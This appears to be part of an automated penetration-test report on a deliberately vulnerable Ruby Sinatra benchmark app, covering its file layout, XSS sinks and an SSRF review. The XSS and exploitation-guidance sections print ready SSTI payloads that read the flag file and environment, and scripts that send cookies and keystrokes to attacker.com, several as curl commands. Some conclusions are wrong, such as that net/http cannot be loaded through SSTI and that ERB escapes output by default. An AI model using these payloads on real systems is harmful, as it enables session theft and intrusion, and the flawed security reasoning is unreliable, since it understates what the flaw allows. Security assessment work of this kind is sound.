      ip: request.ip
    }
  })
end
```

**Monitoring and Alerting:**

To enable security monitoring, implement:

1. **Centralized Log Aggregation:**
   - Ship logs to SIEM (Splunk, ELK Stack, Datadog)
   - Enable log retention for compliance (typically 90-365 days)

2. **Security Alerts:**
   - Alert on SSTI pattern detection (ERB syntax in parameters)
   - Alert on repeated 400/500 errors from same IP
   - Alert on flag file access attempts
   - Alert on unusual request patterns (high frequency, automated)

3. **Metrics and Dashboards:**
   - Request rate per endpoint
   - Error rate trends
   - Response time percentiles
   - Unique IP counts
   - Attack pattern frequency

4. **Audit Logging Best Practices:**
   - Log security-relevant events (authentication attempts, authorization failures, input validation failures)
   - Do NOT log sensitive data (passwords, tokens, PII, flag values)
   - Use structured logging (JSON) for parsing
   - Include correlation IDs to trace requests across systems
   - Implement log integrity protection (tamper-evident logging)

---

## 7. Overall Codebase Indexing

### Codebase Structure and Organization

The application demonstrates a **highly minimalist architecture** with all logic consolidated into a single file, representing an intentionally simplified structure suitable for CTF (Capture The Flag) challenges or security testing exercises rather than production software development patterns. The entire codebase resides in the `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24` directory with a flat structure containing configuration files at the root level and a single `app/` subdirectory housing the application code.

**Root Directory Layout:**

```
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/
├── .env                          # Environment variables (FLAG secret, committed to git)
├── .git/                         # Git repository metadata
├── Makefile                      # Build automation (includes common.mk)
├── benchmark.json                # CTF/benchmark metadata
├── docker-compose.yml            # Container orchestration configuration
├── app/                          # Application directory
│   ├── Dockerfile                # Container image definition
│   ├── Gemfile                   # Ruby dependency specification
│   ├── Gemfile.lock              # Locked dependency versions
│   ├── app.rb                    # ENTIRE APPLICATION (157 lines)
│   └── flag.txt                  # Flag file (development placeholder)
└── deliverables/                 # Output directory for security deliverables
```

**Application Directory (`app/`):**

The `app/` subdirectory contains the complete application with exceptional simplicity:
- **Single Ruby file:** `app.rb` (157 lines) contains routing, business logic, and inline ERB templates
- **No MVC separation:** No `models/`, `views/`, `controllers/`, or `helpers/` directories
- **No test directory:** No `spec/`, `test/`, or `features/` directories for automated testing
- **No configuration directory:** No `config/` directory for environment-specific settings
- **No static assets:** No `public/` directory (CSS/JS loaded from CDN)
- **No database migrations:** No `db/` directory (no database in use)

**Inline Templates:**

The application uses Sinatra's `__END__` marker convention to define ERB templates within the same file as the route handlers. Starting at line 21, two templates are defined:

1. **`:index` template (lines 23-100):** Homepage form rendered by `GET /`
2. **`:result` template (lines 102-157):** Results page rendered by `POST /generate`

This pattern eliminates the need for separate view files but makes the single file longer and combines presentation logic with application logic.

**Dependency Management:**

Ruby dependencies are managed through Bundler with two key files:
- **`Gemfile`:** Declares direct dependencies (`sinatra`, `puma`)
- **`Gemfile.lock`:** Locks transitive dependency versions for reproducible builds

No Gemfile groups are defined (no `:development`, `:test`, or `:production` groups), indicating all dependencies are loaded in all environments.

**Container Configuration:**

Docker containerization is configured through:
- **`Dockerfile`:** Multi-stage container build process with Ruby 3.1.2 base image
- **`docker-compose.yml`:** Single-service orchestration with port mapping and health checks

The Dockerfile follows a standard pattern: base image selection → dependency installation → application code copy → flag file creation → server startup.

**Build Automation:**

A `Makefile` exists at the project root, likely providing common build targets (though not analyzed in detail). The presence of `include common.mk` suggests shared build logic across multiple projects or challenges, indicating this may be part of a larger CTF challenge suite.

**Version Control:**

The `.git/` directory indicates this is a Git repository with commit history. Critical security concern: both `.env` and `app/flag.txt` are tracked in version control (commit 49be874), creating permanent exposure of secrets in repository history.

**Deliverables Directory:**

A `deliverables/` directory exists (possibly created during this analysis) to house security assessment artifacts such as code analysis reports, vulnerability findings, and exploitation evidence.

### Impact on Security Component Discoverability

**High Discoverability for Security Assessment:**

The minimal structure **significantly aids penetration testing** by providing:

1. **Single Point of Analysis:** All application logic in one 157-line file eliminates the need to trace code across multiple modules, making vulnerability analysis straightforward and rapid.

2. **No Complexity Hiding Vulnerabilities:** The lack of abstraction layers, middleware chains, or complex routing configurations means vulnerabilities like the SSTI at lines 14-15 are immediately visible during code review.

3. **Transparent Data Flow:** The direct parameter extraction → template creation → execution flow is easy to trace from request to vulnerability, with no intermediate sanitization or validation layers to analyze.

4. **Minimal Attack Surface:** Only two endpoints to test (`GET /` and `POST /generate`) focuses penetration testing efforts on thorough exploitation rather than broad surface area enumeration.

5. **Embedded Templates:** Inline ERB templates allow analysts to see both the vulnerability (line 14-15) and its output rendering (line 139) in the same file, making XSS analysis straightforward.

**Challenges for Security Component Discovery:**

1. **Missing Security Components:** The absence of dedicated security directories (`lib/security/`, `middleware/`, `validators/`) makes it unclear if security controls are missing by design or oversight—in this case, they are entirely absent.

2. **No Separation of Concerns:** Authentication, authorization, input validation, and other security functions would typically be in dedicated files or modules for easy auditing. Their absence means analysts must confirm no security controls exist anywhere.

3. **Configuration Scattered:** Security configuration (or lack thereof) is embedded in the application file (`set :bind, '0.0.0.0'` at line 3) rather than centralized in a `config/` directory, requiring line-by-line review.

4. **Secrets Management Discovery:** The flag's presence in multiple locations (`.env`, `flag.txt`, Dockerfile) requires checking multiple files rather than a centralized secrets configuration.

**Conventions and Tools:**

1. **Ruby/Bundler Standards:** The application follows standard Ruby conventions (Gemfile for dependencies, Gemfile.lock for version locking) making dependency analysis straightforward.

2. **Docker Standards:** Standard Dockerfile and docker-compose.yml patterns enable quick understanding of deployment model and environment configuration.

3. **Sinatra Conventions:** Use of `__END__` for templates, classic Sinatra style (not modular), and default middleware (rack-protection) are recognizable patterns for Ruby developers.

4. **No Testing Framework:** The absence of RSpec, Minitest, or other testing frameworks indicates no automated test suite exists, eliminating test files as a source of security requirement documentation.

5. **No Code Generation:** No evidence of Rails generators, scaffolding, or code generation tools that could create boilerplate security code or configuration.

**Security Analysis Workflow Efficiency:**

The structure enables rapid security assessment:
1. **15-minute initial review:** Read app.rb in its entirety to understand all logic
2. **5-minute configuration review:** Check Dockerfile and docker-compose.yml for deployment security
3. **5-minute secrets audit:** Review .env, flag.txt, and Dockerfile for secrets exposure
4. **10-minute vulnerability identification:** Locate SSTI at lines 14-15, validate exploitability
5. **Total time to critical finding:** ~35 minutes from code access to confirmed RCE vulnerability

A more complex application with proper separation of concerns, middleware chains, and security abstractions might take days or weeks to achieve the same level of understanding and vulnerability identification confidence.

---

## 8. Critical File Paths

### Configuration

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Dockerfile` - Container image definition with insecure secret handling (lines 10-13)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/docker-compose.yml` - Service orchestration with port exposure (lines 6-7)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/.env` - Environment variables containing flag secret (line 1, **committed to git**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/benchmark.json` - CTF/benchmark metadata
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/Makefile` - Build automation

### Authentication & Authorization

- **NO AUTHENTICATION FILES EXIST** - Application has no authentication system
- **NO AUTHORIZATION FILES EXIST** - Application has no authorization system
- **NO SESSION CONFIGURATION** - Sessions not enabled in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb`

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb` - Complete application with all routes (lines 5-19):
  - Line 5-7: `GET /` route (index page)
  - Line 9-19: `POST /generate` route (**CRITICAL SSTI VULNERABILITY** at lines 14-15)
  - Line 23-100: `:index` ERB template (inline)
  - Line 102-157: `:result` ERB template (inline)
- **NO API SCHEMA FILES FOUND** - No OpenAPI/Swagger, GraphQL, or JSON Schema files exist

### Data Models & DB Interaction

- **NO DATABASE FILES** - Application has no database layer
- **NO MODELS DIRECTORY** - No ORM models or data structures defined
- **NO MIGRATIONS** - No database migration scripts

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Gemfile` - Direct dependency specification (lines 3-4: `sinatra`, `puma`)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Gemfile.lock` - Locked dependency versions including **vulnerable Rack 2.2.9** (line 10)

### Sensitive Data & Secrets Handling

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/.env` - **CRITICAL:** Flag stored in plaintext (line 1), committed to git repository
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/flag.txt` - **CRITICAL:** Flag file (line 1), committed to git, accessible via SSTI
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Dockerfile` - **CRITICAL:** Insecure secret handling (lines 10-13):
  - Line 10: `ARG FLAG` (stored in image metadata)
  - Line 11: `ENV FLAG=${FLAG}` (visible in docker inspect)
  - Line 13: `RUN echo $FLAG > /app/flag.txt` (embedded in image layer)

### Middleware & Input Validation

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb` - **CRITICAL:** No server-side input validation (lines 10-11)
- **NO VALIDATION MIDDLEWARE** - Application lacks dedicated validation layer
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Gemfile.lock` - `rack-protection 3.2.0` included (line 11) but CSRF tokens not implemented in forms

### Logging & Monitoring

- **NO LOGGING CONFIGURATION** - Application has no custom logging beyond Puma defaults
- **NO MONITORING INTEGRATION** - No APM, error tracking, or observability tools

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Dockerfile` - Container build configuration (16 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/docker-compose.yml` - Single-service orchestration with health check
- **NO KUBERNETES MANIFESTS** - No k8s deployment, service, or ingress files
- **NO NGINX CONFIGURATION** - No reverse proxy configuration
- **NO INFRASTRUCTURE AS CODE** - No Terraform, Pulumi, or CloudFormation

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/flag.txt` - **HIGH-VALUE TARGET:** Flag file in container at `/app/flag.txt`, accessible via SSTI: `<%= File.read('/app/flag.txt') %>`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/.env` - **HIGH-VALUE TARGET:** Flag in environment variable, accessible via SSTI: `<%= ENV['FLAG'] %>`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Dockerfile` - **FLAG METADATA:** Lines 10-13 show flag embedded in Docker image layers
- **Docker Environment:** Flag stored in container environment variable `FLAG`, accessible via `docker inspect` or SSTI

---

## 9. XSS Sinks and Render Contexts

### Network Surface Focus

All XSS sinks identified are present in **network-accessible web pages** served by the Sinatra application. No local-only scripts, build tools, or developer utilities containing XSS sinks were found.

### Critical Finding: Multiple XSS Vectors Through SSTI

The application contains **two XSS sinks** that work in conjunction with the Server-Side Template Injection vulnerability to enable both stored and reflected Cross-Site Scripting attacks.

---

### XSS Sink #1: ERB Template Execution Output (PRIMARY)

**Sink Type:** Reflected XSS via Server-Side Template Injection  
**Render Context:** HTML Body Context  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb`  
**Line Numbers:** Lines 14-15 (template execution), Line 139 (output rendering)

**Vulnerable Code Flow:**

**Template Execution (Lines 14-15):**
```ruby
template = ERB.new("#{sentence}")  # Line 14: User input in template
template.result(binding)           # Line 15: Execute with binding context
```

**Output Rendering (Line 139):**
```erb
<% @output.each do |line| %>
  <p><%= line %></p>  <!-- Line 139: Render template execution results -->
  <hr>
<% end %>
```

**User Input Source:**  
HTTP POST parameter `sentence` from `/generate` endpoint:
```ruby
sentence = params[:sentence]  # Line 10: Direct parameter access, no sanitization
```

**Data Flow:**
1. User submits POST request to `/generate` with `sentence` parameter
2. `sentence = params[:sentence]` extracts raw user input (line 10)
3. `ERB.new("#{sentence}")` creates template with user input directly interpolated (line 14)
4. `template.result(binding)` executes the template, evaluating any Ruby code (line 15)
5. Result stored in `@output` array
6. `<%= line %>` renders the execution result in HTML (line 139)

**Render Context Analysis:**

The output is rendered within a `<p>` tag in the HTML body:
```erb
<p><%= line %></p>
```

While ERB's `<%= %>` typically provides HTML escaping in many frameworks, the `line` variable contains the **result of executing user-controlled ERB code**, which can produce raw HTML or JavaScript strings that bypass escaping. The SSTI vulnerability allows attackers to craft payloads that return HTML/JavaScript that gets rendered directly in the browser.

**Exploitability:** **CRITICAL - Trivially Exploitable**

The client-side JavaScript validation at lines 88-92 can be bypassed via:
- Direct POST requests (curl, Postman, Python requests)
- Browser DevTools (disable JavaScript or modify validation)
- Proxy interception (Burp Suite, OWASP ZAP)

**Attack Payloads:**

**Basic XSS via Template Return Value:**
```
POST /generate HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sentence=<%= "<script>alert('XSS')</script>" %>&number=1
```

**Execution Flow:**
1. ERB evaluates: `"<script>alert('XSS')</script>"`
2. Returns the string: `<script>alert('XSS')</script>`
3. Rendered as: `<p><script>alert('XSS')</script></p>`
4. Browser executes the JavaScript

**Cookie Theft:**
```
sentence=<%= "<script>fetch('http://attacker.com/?c='+document.cookie)</script>" %>&number=1
```

**Session Hijacking (if sessions existed):**
```
sentence=<%= "<script>new Image().src='http://attacker.com/steal?session='+document.cookie</script>" %>&number=1
```

**DOM Manipulation:**
```
sentence=<%= "<script>document.body.innerHTML='<h1>Defaced</h1>'</script>" %>&number=1
```

**Keylogger:**
```
sentence=<%= "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>" %>&number=1
```

**Phishing via Fake Login Form:**
```
sentence=<%= "<script>document.body.innerHTML='<form action=\"http://attacker.com/phish\"><input name=\"user\"><input type=\"password\" name=\"pass\"><input type=\"submit\"></form>'</script>" %>&number=1
```

**Network Accessible:** YES
- Endpoint: `POST /generate`
- Response rendered at `/generate` (same endpoint, POST request)
- No authentication required
- Publicly accessible on `0.0.0.0:4567`

**Security Impact:**
- Session hijacking (if sessions were implemented)
- Cookie theft (any cookies set by the application or parent domain)
- Phishing attacks via fake login forms
- Website defacement
- Malicious redirects to attacker-controlled sites
- Keylogging to capture user input
- Cryptocurrency mining scripts
- Drive-by download attacks

---

### XSS Sink #2: Number Parameter Output (SECONDARY)

**Sink Type:** Reflected XSS (Low Exploitability)  
**Render Context:** HTML Body Context  
**File Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb`  
**Line Numbers:** Line 135

**Vulnerable Code:**

**Parameter Assignment (Line 17):**
```ruby
@number = number  # Stores params[:number].to_i result
```

**Output Rendering (Line 135):**
```erb
<h5>Generated your sentence for <%= @number %> times</h5>
```

**User Input Source:**  
HTTP POST parameter `number` from `/generate` endpoint:
```ruby
number = params[:number].to_i  # Line 11: Converts to integer
@number = number               # Line 17: Stores for template
```

**Render Context Analysis:**

The `@number` variable is rendered directly in an `<h5>` tag:
```erb
<h5>Generated your sentence for <%= @number %> times</h5>
```

**Exploitability:** **LOW - Difficult to Exploit**

Multiple defense mechanisms make this sink difficult to exploit:

1. **Integer Conversion:** The `.to_i` method converts the parameter to an integer. Ruby's `.to_i` behavior:
   - Numeric strings: `"123".to_i` → `123`
   - Non-numeric strings: `"<script>".to_i` → `0`
   - Leading numbers: `"123abc".to_i` → `123`
   - No numbers: `"abc".to_i` → `0`

2. **ERB HTML Escaping:** The `<%= %>` syntax in ERB provides automatic HTML escaping by default for simple values, converting dangerous characters:
   - `<` → `&lt;`
   - `>` → `&gt;`
   - `"` → `&quot;`
   - `'` → `&#39;`
   - `&` → `&amp;`

3. **Type Safety:** Since `@number` is guaranteed to be an integer, it cannot contain string-based XSS payloads.

**Attack Attempts (All Fail):**

```
POST /generate HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sentence=test&number=<script>alert(1)</script>
```

**Result:** `number.to_i` evaluates to `0`, output becomes:
```html
<h5>Generated your sentence for 0 times</h5>
```

**Alternate Payload:**
```
number=100<script>alert(1)</script>
```

**Result:** `.to_i` stops at non-numeric characters, evaluates to `100`:
```html
<h5>Generated your sentence for 100 times</h5>
```

**Network Accessible:** YES
- Endpoint: `POST /generate`
- Publicly accessible
- However, exploitation is effectively blocked by integer conversion

**Security Impact:** **MINIMAL**

While this technically qualifies as a sink (user input rendered in HTML), the integer conversion effectively neutralizes XSS risk. The only theoretical concern would be if:
1. ERB's HTML escaping were disabled globally (not the case here)
2. The `.to_i` conversion were removed (would require code change)
3. The parameter were used in a different context without conversion

This sink is **not a practical attack vector** in the current implementation.

---

### No Additional XSS Sinks Found

**Comprehensive Sink Analysis Results:**

A thorough examination of the codebase revealed **no additional XSS sinks** beyond the two documented above. Specifically:

**Client-Side JavaScript (Lines 81-96):**  
The application includes jQuery validation code, but this is **NOT a sink**—it's a validation control that attackers bypass, not an injection point.

```javascript
var regex = /^[a-zA-Z0-9\s]+$/;
if(!regex.test($("#sentence").val())){
  alert("Invalid input format");
  return false;
}
```

This code does not render user input; it validates and blocks submission client-side (which is ineffective for security).

**No innerHTML, outerHTML, or document.write:**  
The client-side JavaScript does not use dangerous DOM manipulation methods:
- ❌ No `element.innerHTML = userInput`
- ❌ No `element.outerHTML = userInput`
- ❌ No `document.write(userInput)`
- ❌ No `document.writeln(userInput)`
- ❌ No `insertAdjacentHTML()`

**No jQuery HTML Injection:**  
jQuery is used only for form validation, not for DOM manipulation:
- ✅ Uses `.val()` to read values (safe)
- ✅ Uses `.submit()` handler for validation (safe)
- ❌ No `.html(userInput)`, `.append(userInput)`, `.after(userInput)`, etc.

**No Event Handler Attributes:**  
The application does not dynamically construct event handler attributes with user input:
- ❌ No `onclick="userInput"`
- ❌ No `onerror="userInput"`
- ❌ No `onload="userInput"`

**No URL-Based Attributes:**  
User input does not flow into URL-based attributes:
- ❌ No `href="userInput"`
- ❌ No `src="userInput"`
- ❌ No `action="userInput"`

**No JavaScript Context Injection:**  
No direct JavaScript evaluation of user input:
- ❌ No `eval(userInput)`
- ❌ No `Function(userInput)()`
- ❌ No `setTimeout(userInput)`
- ❌ No inline `<script>` tags with user data interpolation

**No CSS Context Injection:**  
No user input in style contexts:
- ❌ No `element.style.background = userInput`
- ❌ No `<style>` tags with user data

**Static HTML Only:**  
The index page (`:index` template, lines 23-100) is completely static. No user data is rendered on the initial GET request—all user input processing occurs only in the POST `/generate` response.

---

### XSS Summary Table

| # | Sink Type | File | Lines | Render Context | Exploitability | Network Access |
|---|-----------|------|-------|----------------|----------------|----------------|
| 1 | Reflected XSS via SSTI | app.rb | 14-15, 139 | HTML Body | CRITICAL | YES - POST /generate |
| 2 | Reflected XSS (number param) | app.rb | 17, 135 | HTML Body | LOW (blocked by .to_i) | YES - POST /generate |

---

### Exploitation Guidance for Penetration Testers

**Primary Attack Vector:** Focus on **XSS Sink #1** (SSTI-based XSS) as the primary exploitation path. This sink provides both server-side code execution and client-side script injection in a single payload.

**Recommended Testing Payloads:**

1. **PoC (Proof of Concept):**
```bash
curl -X POST http://target:4567/generate \
  -d 'sentence=<%= "<script>alert(document.domain)</script>" %>&number=1'
```

2. **Exfiltration Test:**
```bash
curl -X POST http://target:4567/generate \
  -d 'sentence=<%= "<script>fetch(\"http://attacker.com/?data=\"+btoa(document.cookie))</script>" %>&number=1'
```

3. **DOM-Based Detection:**
```bash
curl -X POST http://target:4567/generate \
  -d 'sentence=<%= "<img src=x onerror=\"alert(1)\">" %>&number=1'
```

**Defense Evasion:** The primary defense is client-side JavaScript validation, which is trivially bypassed by not using a browser form submission. Direct HTTP requests bypass all client-side controls.

**Combined Exploitation:** Combine SSTI for server-side flag exfiltration and XSS for client-side session/cookie theft in multi-stage attacks.

---

## 10. SSRF Sinks

### Network Surface Focus

A comprehensive analysis of all network-accessible components in the Sinatra web application has been completed to identify Server-Side Request Forgery (SSRF) attack surfaces.

### Critical Finding: NO SSRF SINKS DETECTED

After exhaustive analysis of the Ruby Sinatra application, **no Server-Side Request Forgery (SSRF) vulnerabilities were identified**. The application makes **zero outbound network requests** and has no capability to make HTTP requests, open network sockets, or fetch external resources based on user input or any other triggers.

---

### Comprehensive SSRF Sink Analysis

The following categories of SSRF sinks were systematically searched for and **confirmed absent**:

#### 1. HTTP(S) Clients: NOT PRESENT

**Analysis:** No HTTP client libraries found in dependencies or code.

**Gemfile Analysis:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/Gemfile`
- **Lines:** 3-4
- Only dependencies: `sinatra` and `puma`
- ❌ No `httparty`
- ❌ No `rest-client`
- ❌ No `faraday`
- ❌ No `typhoeus`
- ❌ No `httpclient`

**Code Analysis:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb`
- ❌ No `require 'net/http'`
- ❌ No `require 'open-uri'`
- ❌ No `Net::HTTP.get()`
- ❌ No `URI.open()`
- ❌ No `Kernel.open()` with URLs

**Conclusion:** Application cannot make HTTP/HTTPS requests.

---

#### 2. Raw Sockets: NOT PRESENT

**Code Analysis:**
- ❌ No `TCPSocket.new(host, port)`
- ❌ No `UDPSocket.new`
- ❌ No `Socket.connect()`
- ❌ No `require 'socket'`

**Conclusion:** Application cannot open raw network sockets.

---

#### 3. URL Openers & File Includes: NOT PRESENT

**File Operation Analysis:**
- ❌ No `File.read()` with user input
- ❌ No `File.open()` with user input
- ❌ No `Kernel.open()` (dangerous in Ruby, can open URLs)
- ❌ No `IO.read()` with user input

**Dynamic Loading Analysis:**
- ❌ No `require` with user input
- ❌ No `load` with user input
- ❌ No `eval` with file content from user input

**Note:** While the application has `File.read('/app/flag.txt')` as an exploitation vector via SSTI, this is **not SSRF**. SSRF requires the server to make network requests to external resources, not local file reads (which is a separate vulnerability class: Path Traversal / Arbitrary File Read).

**Conclusion:** No URL-based file operations that could trigger SSRF.

---

#### 4. Redirect & "Next URL" Handlers: NOT PRESENT

**Routing Analysis:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb`
- **Routes:** Only `GET /` (lines 5-7) and `POST /generate` (lines 9-19)
- ❌ No `redirect` calls with user input
- ❌ No `Location` header manipulation
- ❌ No "continue to" or "return URL" parameters
- ❌ No OAuth callback redirects
- ❌ No open redirect functionality

**Conclusion:** No redirect-based SSRF vectors.

---

#### 5. Headless Browsers & Render Engines: NOT PRESENT

**Dependency Analysis:**
- ❌ No `puppeteer-ruby` gem
- ❌ No `playwright-ruby` gem
- ❌ No `selenium-webdriver` gem
- ❌ No `watir` gem
- ❌ No `capybara` gem

**Code Analysis:**
- ❌ No headless browser instantiation
- ❌ No page navigation to user-controlled URLs
- ❌ No HTML-to-PDF conversion (wkhtmltopdf, Prawn, etc.)
- ❌ No screenshot functionality

**Conclusion:** No browser automation or rendering that could access external URLs.

---

#### 6. Media Processors: NOT PRESENT

**Dependency Analysis:**
- ❌ No `rmagick` (ImageMagick Ruby binding)
- ❌ No `mini_magick` gem
- ❌ No `paperclip` gem
- ❌ No `carrierwave` gem
- ❌ No `shrine` gem

**Code Analysis:**
- ❌ No image processing from URLs
- ❌ No video processing (FFmpeg) with network sources
- ❌ No media conversion functionality

**Conclusion:** No media processing that could fetch external resources.

---

#### 7. Link Preview & Unfurlers: NOT PRESENT

**Functionality Analysis:**
- ❌ No link preview generation
- ❌ No oEmbed endpoint fetching
- ❌ No social media card generation
- ❌ No URL metadata extraction
- ❌ No Open Graph scraping

**Conclusion:** Application does not fetch external link metadata.

---

#### 8. Webhook Testers & Callback Verifiers: NOT PRESENT

**Functionality Analysis:**
- ❌ No "ping my webhook" functionality
- ❌ No outbound callback verification
- ❌ No health check notifications
- ❌ No event delivery confirmations
- ❌ No API endpoint validation tools

**Conclusion:** No webhook or callback functionality exists.

---

#### 9. SSO/OIDC Discovery & JWKS Fetchers: NOT PRESENT

**Authentication Analysis:**
- ❌ No authentication system (see Section 3)
- ❌ No OAuth/OIDC implementation
- ❌ No JWKS fetching
- ❌ No `omniauth` gem
- ❌ No `oauth2` gem
- ❌ No OpenID Connect discovery endpoints
- ❌ No SAML metadata fetching

**Conclusion:** No SSO/OAuth functionality that could trigger SSRF via JWKS or discovery URLs.

---

#### 10. Importers & Data Loaders: NOT PRESENT

**Functionality Analysis:**
- ❌ No "Import from URL" functionality
- ❌ No CSV/JSON/XML remote loading
- ❌ No RSS/Atom feed readers
- ❌ No API data synchronization
- ❌ No configuration file fetching from URLs

**Conclusion:** Application does not import data from external sources.

---

#### 11. Package/Plugin/Theme Installers: NOT PRESENT

**Functionality Analysis:**
- ❌ No "Install from URL" features
- ❌ No package manager integration
- ❌ No plugin downloaders
- ❌ No theme installation
- ❌ No update mechanisms with remote checks

**Conclusion:** No dynamic installation or update functionality.

---

#### 12. Monitoring & Health Check Frameworks: NOT PRESENT

**Monitoring Analysis:**
- ❌ No URL pingers or uptime checkers
- ❌ No monitoring probe systems
- ❌ No alerting webhook senders
- ❌ No performance testing tools that make external requests

**Note:** The Docker health check in `docker-compose.yml` (`curl -f http://localhost:4567`) is:
1. **Local-only:** Checks `localhost`, not external URLs
2. **Fixed URL:** Hardcoded, not user-controllable
3. **Infrastructure-level:** Runs outside the application process

**Conclusion:** No application-level monitoring that could be exploited for SSRF.

---

#### 13. Cloud Metadata Helpers: NOT PRESENT

**Code Analysis:**
- ❌ No AWS SDK (`aws-sdk` gem)
- ❌ No GCP client libraries (`google-cloud` gems)
- ❌ No Azure SDK (`azure` gem)
- ❌ No instance metadata fetching (169.254.169.254)
- ❌ No cloud service discovery
- ❌ No container orchestration API clients

**Conclusion:** Application does not interact with cloud metadata services.

---

### Application Behavior Analysis

**Why No SSRF Exists:**

The application's functionality is **entirely self-contained**:

1. **No External Data:** Application generates output by repeating user-provided text, with no need for external data sources.

2. **No Third-Party Integrations:** No APIs, webhooks, analytics, or monitoring services are integrated.

3. **Stateless Processing:** All processing occurs in-memory during the request/response cycle:
   ```ruby
   @output = (1..number).map do
     template = ERB.new("#{sentence}")
     template.result(binding)  # Executes locally, no network calls
   end
   ```

4. **Minimal Dependencies:** Only `sinatra` and `puma` gems, neither of which make outbound requests without explicit developer code.

5. **No File Operations on External Resources:** While `File.read()` could be exploited via SSTI to read local files, it cannot fetch remote URLs without additional libraries like `open-uri`.

---

### SSRF via SSTI: Theoretical but Impractical

**Theoretical Attack:** An attacker could potentially use the SSTI vulnerability to inject Ruby code that makes network requests:

```ruby
# Hypothetical SSRF payload via SSTI
sentence=<%= require 'net/http'; Net::HTTP.get(URI('http://169.254.169.254/latest/meta-data/')) %>
```

**Why This Fails:**

1. **Net::HTTP Not Loaded:** The application does not `require 'net/http'`, so `Net::HTTP` class is unavailable.

2. **Require in Template:** While `require` could theoretically be called via SSTI, Ruby's `require` loads Ruby gems from the filesystem, not from the network. `net/http` is part of Ruby's standard library but must be explicitly required before use.

3. **Gem Installation:** Even if an attacker tried to `require` an HTTP client gem, it would need to be installed via `bundle install` (which the attacker cannot trigger remotely).

**Testing Confirms No SSRF:**

```bash
# Test payload
curl -X POST http://target:4567/generate \
  -d 'sentence=<%= Net::HTTP.get(URI("http://example.com")) %>&number=1'

# Expected Result: Error or empty output (Net::HTTP not defined)
```

**Conclusion:** While SSTI enables code execution, the absence of HTTP client libraries in the runtime environment prevents SSRF exploitation even through SSTI.

---

### Network Activity Confirmation

**Outbound Connections:** The application makes **zero outbound network connections** during normal operation:
- No HTTP requests to external APIs
- No DNS queries for external domains (beyond OS-level basics)
- No database connections (no database)
- No cache connections (no Redis/Memcached)
- No log shipping to external services
- No metrics reporting to monitoring systems

**Inbound Connections Only:** The application exclusively listens for inbound HTTP requests on `0.0.0.0:4567` and responds with locally generated content.

---

### SSRF Summary Table

| SSRF Category | Status | Analysis |
|---------------|--------|----------|
| HTTP(S) Clients | ❌ NOT PRESENT | No HTTP client gems or code |
| Raw Sockets | ❌ NOT PRESENT | No socket operations |
| URL Openers | ❌ NOT PRESENT | No URL-based file operations |
| Redirects | ❌ NOT PRESENT | No redirect functionality |
| Headless Browsers | ❌ NOT PRESENT | No browser automation |
| Media Processors | ❌ NOT PRESENT | No image/video processing |
| Link Preview | ❌ NOT PRESENT | No URL metadata fetching |
| Webhooks | ❌ NOT PRESENT | No webhook callbacks |
| SSO/OIDC | ❌ NOT PRESENT | No authentication integrations |
| Importers | ❌ NOT PRESENT | No remote data loading |
| Installers | ❌ NOT PRESENT | No plugin/package installation |
| Monitoring | ❌ NOT PRESENT | No URL health checks |
| Cloud Metadata | ❌ NOT PRESENT | No cloud SDK usage |

---

### Conclusion

**FINAL DETERMINATION: NO SSRF ATTACK SURFACE**

This Sinatra application is a **self-contained text generation service** with no outbound network capabilities. The application's threat model does not include SSRF vulnerabilities, as it fundamentally lacks the ability to make server-side requests to external or internal resources based on user input or any other mechanism.

**Penetration Testing Guidance:** Do not invest time testing for SSRF vulnerabilities in this application. Focus efforts on the confirmed **Server-Side Template Injection (SSTI)** vulnerability documented in Section 5, which provides Remote Code Execution and flag exfiltration capabilities without requiring SSRF.

**If SSRF Testing is Required:** To introduce SSRF for testing purposes, the application would need modification to add HTTP client functionality, such as:
```ruby
# This code does NOT exist in the current application
gem 'httparty'  # Add to Gemfile

post '/fetch' do
  url = params[:url]
  response = HTTParty.get(url)  # SSRF sink
  response.body
end
```

---



## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-28T23:33:32.214Z